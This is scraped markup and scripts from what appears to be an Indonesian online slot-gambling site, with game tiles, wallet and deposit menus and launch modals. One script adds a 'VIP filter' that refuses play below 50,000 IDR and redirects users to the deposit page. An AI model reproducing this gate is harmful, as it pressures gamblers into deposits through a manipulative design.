                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Nightfall Hunting" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Nightfall Hunting', '/assets/games/i/165x220/jili/5d158f63fa496e1989f52ee481e5e9cf.webp?v=0.1' , '324', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/5d158f63fa496e1989f52ee481e5e9cf.webp?v=0.1" src="/assets/games/i/165x220/jili/5d158f63fa496e1989f52ee481e5e9cf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Nightfall Hunting">Nightfall Hunting</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shōgun" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shōgun', '/assets/games/i/165x220/jili/dbba87d7acc28e31a1615d221ba66241.webp?v=0.1' , '376', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/dbba87d7acc28e31a1615d221ba66241.webp?v=0.1" src="/assets/games/i/165x220/jili/dbba87d7acc28e31a1615d221ba66241.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shōgun">Shōgun</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Poseidon" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Poseidon', '/assets/games/i/165x220/jili/b9aca6155b0727754de0c7dd72a39663.webp?v=0.1' , '375', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b9aca6155b0727754de0c7dd72a39663.webp?v=0.1" src="/assets/games/i/165x220/jili/b9aca6155b0727754de0c7dd72a39663.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Poseidon">Poseidon</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="3 Lucky Piggy" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '3 Lucky Piggy', '/assets/games/i/165x220/jili/e1121478d307387170277e0ae692ae0c.webp?v=0.1' , '400', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/e1121478d307387170277e0ae692ae0c.webp?v=0.1" src="/assets/games/i/165x220/jili/e1121478d307387170277e0ae692ae0c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="3 Lucky Piggy">3 Lucky Piggy</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Party Star" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Party Star', '/assets/games/i/165x220/jili/b17930874670ccc222c706bd0a8d8183.webp?v=0.1' , '240', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/b17930874670ccc222c706bd0a8d8183.webp?v=0.1" src="/assets/games/i/165x220/jili/b17930874670ccc222c706bd0a8d8183.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Party Star">Party Star</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Pig House" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Pig House', '/assets/games/i/165x220/jili/20472680f2d3bd3eccf750bae9a49eef.webp?v=0.1' , '263', '' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/20472680f2d3bd3eccf750bae9a49eef.webp?v=0.1" src="/assets/games/i/165x220/jili/20472680f2d3bd3eccf750bae9a49eef.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Pig House">The Pig House</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Gems 2" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Gems 2', '/assets/games/i/165x220/jili/a6efa87bec842e569826a6f16bc5dc99.webp?v=0.2' , '223', '154' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/a6efa87bec842e569826a6f16bc5dc99.webp?v=0.2" src="/assets/games/i/165x220/jili/a6efa87bec842e569826a6f16bc5dc99.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Gems 2">Fortune Gems 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fortune Gems" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fortune Gems', '/assets/games/i/165x220/jili/07ad015020adad2b4561c0b8a9d951ce.webp?v=0.2' , '109', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/07ad015020adad2b4561c0b8a9d951ce.webp?v=0.2" src="/assets/games/i/165x220/jili/07ad015020adad2b4561c0b8a9d951ce.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fortune Gems">Fortune Gems</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Golden Empire" data-filter="ALL,TOP" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Golden Empire', '/assets/games/i/165x220/jili/d326bd9890bd5e13d0c85650795dcf3e.webp?v=0.2' , '103', '152' )" style="">

          <div class="content-wrapper">
              
                                    <img class=" lazyloaded" data-src="/assets/games/i/165x220/jili/d326bd9890bd5e13d0c85650795dcf3e.webp?v=0.2" src="/assets/games/i/165x220/jili/d326bd9890bd5e13d0c85650795dcf3e.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Golden Empire">Golden Empire</h5>
        </a>
        
     
  </div>

</div>

<div class="nifty-modal slide-in-bottom " id="gamelinksModal-1">
	<div class="md-content">
		<div class="md-body">
			<div class="row mb-4 no-gutters">
				<div class="col-xs-5">
					<img src="" class="img-fluid">
				</div>
				<div class="col-xs-7">
					<div class="g-title"></div>
				</div>
				<input type="hidden" value="" name="hiddenGameCode001" id="hiddenGameCode001">
				<input type="hidden" value="" name="hiddenSubGameCode001" id="hiddenSubGameCode001">

			</div>

			<div class="row  pt-2">
				<div class="col-xs-5">
										<button class="btn btn-block btn-secondary" onclick="subGameLaunch(event, 1)" i18n="@TryNow">
						DEMO
					</button>
									</div>
				<div class="col-xs-7   ">
					<button class="btn  btn-block btn-primary" onclick="subGameLaunch(event,0)" i18n="@PlayNow">
						MAIN SEKARANG					</button>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="md-overlay"></div>
<script>
  function subGameLaunch(e, isDemo) {
    if (!window.isAuth) {
      if (typeof alertLogin === "function") alertLogin(e);
      return;
    }

    // Ambil saldo murni dari database via PHP
    var saldoMember = <?php echo (int)$saldo_murni; ?>; 

    // --- FILTER VIP BABY B88 (MINIMAL DI ATAS 50.000) ---
    // Jika saldo 50.000 ke bawah, tendang ke Deposit
    if (saldoMember <= 50000) {
        alert("MOHON MAAF DEPOSIT TERLEBIH DAHULU!!\nSaldo Kamu saat ini: Rp " + saldoMember.toLocaleString('id-ID') + "\n\nKlik OK untuk ke halaman DEPOSIT.");
        window.location.href = 'deposit.php';
        return;
    }

    // Jika saldo di atas 50.000, lanjut ke game
    var gID = $('#hiddenGameID-001').val() || '';
    var gCode = $('#hiddenGameCode001').val() || '';
    var sCode = $('#hiddenSubGameCode001').val() || '';
    
    var link = 'play.php?id=' + gCode + '&provider=' + gID + '&sub=' + sCode;
    window.location.href = link;
  }
</script>
<div class="nifty-modal slide-in-bottom " id="filterModal-2">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            <p id="" i18n="">Select a filter : 
                                                                                </p></div>
                        <div>
                            <button class="btn btn-primary" id="btnApplyFilter_01">APPLY</button>
                        </div>
  				</div>
			</div>
</div>
<div class="md-overlay"></div>

<div class="nifty-modal slide-in-bottom " id="searchModal">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            	<div class="search_filter">
											            <span class="srch_icon md-close"><i class="icon-keyboard_arrow_left"></i></span>
											            <input type="text" matinput="" placeholder="Search" [(ngmodel)]="filterInput" maxlength="255" class="search" (change)="search($event)" i18n-placeholder="@Search">
											            <button matsuffix="" class="btn srch_button" (click)="clearSearch($event)"><i class="icon-x-square"></i></button>
											        </div>
                        </div>

  				</div>
			</div>
</div>
<div class="md-overlay"></div>
<script>
         var joinedJpIds = "";
         var gameCode = "jili_slot";
       function showGameLinks(e,name,imgSrc,gameCode,subCode){

            $('#gamelinksModal-1 .g-title').text(name);
            $('#gamelinksModal-1 img').attr( 'src',imgSrc);
            $('#hiddenGameCode001').val( gameCode );
            $('#hiddenSubGameCode001').val( subCode );
            $('#gamelinksModal-1').nifty("show");
        }


          $(document).ready(function () {
              var hotGame = '';
          
              if(hotGame){ 
                  $('.game-box').each(function() {
                        var isMatch = hotGame == $(this).data('title');
                        if(isMatch){
                              $(this).trigger('click');
                              return false;
                        }
                  });
              }

              /*search*/
              $('.search').keyup(function() {
                    
                    var value = $(this).val().toLowerCase();
                    var exp = new RegExp(value);
                    $('.game-box').each(function() {
                    var isMatch = exp.test(((typeof $(this).find('h5').data('title') == 'string') ? $(this).find('h5').data('title').toLowerCase() : $(this).find('h5').data('title')));
                    $(this).toggle(isMatch);
                    });
              });
              $('.srch_button').click(function(){
                    $('.search').val("");
                    $('.search').trigger("keyup");
              });
              /*search end*/


                $('.sub-games .filter .top').addClass('active');

                  function filterGameBoxes(self){

                        $('.sub-games .filter .btn').removeClass('active');
                        $(self).addClass('active');
                        var filterType= $(self).data('filter');

                        $('.sub-games .game-box').hide();
                        $('.sub-games .game-box').filter(function(){
                        return $(this).data("filter").indexOf(filterType)>=0;
                        }).show();

                  }


                  //Default to All Games :
                  filterGameBoxes($('.sub-games .filter .btn[data-filter=ALL]')[0]);

                  //Add filter btn event listen
                  $('.sub-games .filter .btn.f').click(function(){

                               filterGameBoxes(this);
                  })

                  $('#btnApplyFilter_01').click(function(){

                         var selFilter = $('input[name="rdFilterSubGames"]:checked').val();
                          var e =  $('#btnFilters_003')[0];
                          $(e).data('filter', selFilter);
                          filterGameBoxes(e);
                          $('#filterModal-2').nifty('hide');


                  })
                

                  if(joinedJpIds){
                              var url = "https://jpn-ticker-gcp-str.hep200512.com/v1/ticker?currency="+window.currencyCode +"&jackpotIds=" + joinedJpIds; 
           
                              
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                                    delete $.ajaxSettings.headers["X-CSRF-TOKEN"];
                                    // console.log("remove X-CSRF-TOKEN header");
                                    // alert("remove X-CSRF-TOKEN header");
                              }
                              $.ajax({
                                          url: url,
                                          type: 'GET', 
                                          dataType: 'json', 
                                          headers: {
                                   
                                          },
                                          beforeSend: function(jqXHR, settings) {
                                                          
                                            }
                              })
                              .done(function(data) {
                                    if(data && data.length>0 ){
                                                //console.log(data);
                                          for (let i = 0; i < data.length; i++) {
                                                var  jp  = data[i];
                                                if(jp.jackpotId && jp.pools ){
                                                      var pool = jp.pools;
                                                      for(var key in pool ){ 
                                                                  if(pool.hasOwnProperty(key)){
                                                                        var amt = pool[key].amount;
                                                                       
                                                                        if(amt > 0 ){
                                                                              // console.log(amt);
                                                                               
                                                                              amt = amt.toString()
                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').text( window.currencyCode +' ' +window.formatNumber(amt)).show();

                                                                              $('[data-jpid="'+ jp.jackpotId +'"]').find('.amount_box').each(function () {
                                                                              $(this).prop('Counter', 0).animate({
                                                                                    Counter: amt
                                                                              }, {
                                                                                    duration: 7000,
                                                                                    step: function (func) {
                                                                                    $(this).text(window.currencyCode +' ' +window.formatNumber(func.toString()));
                                                                                    }
                                                                              });
                                                                              });
                                                                        }
                                                                  }
                                                              break;
                                                      }
                                                }
                                                   
                                          }

                                                
                                      }
                                                
                                  
                                   
                              }) ;
                              if($.ajaxSettings && $.ajaxSettings.headers) {
                              
                                    $.ajaxSettings.headers["X-CSRF-TOKEN"] = $('meta[name="csrf-token"]').attr('content'); 
                                    // console.log("add back X-CSRF-TOKEN  header");
                                    // alert("add back X-CSRF-TOKEN header");
                              }
                 }

          });
</script>

                    <div class="mobilesite-footer">  
          <div class="container">
              <style media="screen">
.left-custom-livechat-code{
  bottom: 58px !important;
}
#chat-widget-container{
  bottom: 51px !important;
}
</style>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                        <div class="flex-row  text-center">
                <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/home.php?i=1#"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                

                                
                                  <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/promosaya.php"><i class="icon-gift"></i> <div style="text-transform:uppercase;">Promo saya</div></a>
                  </div>
                
                <div class=" footericon-single">
                    <a href="javascript:void(0);" class="text-uppercase togglemenu-trigger footer-funds" data-showid="#fundshover_menu"><i class="icon-transfer"></i> <div>Dana</div></a>
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="">Withdraw</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                </div>
                                                <div class=" footericon-single">
                    <a href="https://www.Goblin88.site/memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
                      
                            <div class="mail_icon" style="">26</div>
                        
                    </a>
                </div>
                
<div class=" footericon-single" style="position: relative">
    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu"><i class="icon-chat1"></i><div>LIVE CHAT</div></a>
    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu">
        <li>
            <!-- 👇 Link statis diganti pakai variabel PHP $linkLiveChat, dan script JS dihapus -->
            <a href="javascript:void(0)" id="livechat-btn" onclick="openLiveChat('https://direct.lc.chat/19926541/' , '')">
                <i class="icon-chat1"></i>
            </a>
        </li>
                                                              
        <li>
            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank "><i class="icon-whatsapp"></i></a>
        </li>                          
                                                   
        <li>
            <a href="https://telegram.me/BABYBOSSQOFFICIAL" target="_blank "><i class="icon-telegram"></i></a>
        </li>
    </ul>
</div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="6mpScfAoG0WWOBdqpvKSa5nHR7C4udBoqhKvvRL6">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="188.67">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk">188.67</div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00" required="">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="/assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <script>
    

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
    <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
    <link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


    <script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  true  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='MERCUSUAR77';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-25 08:25:39";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'BPDSULTENG'){
                    custom_minLength = 10;
                    custom_maxLength = 15;
                }
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
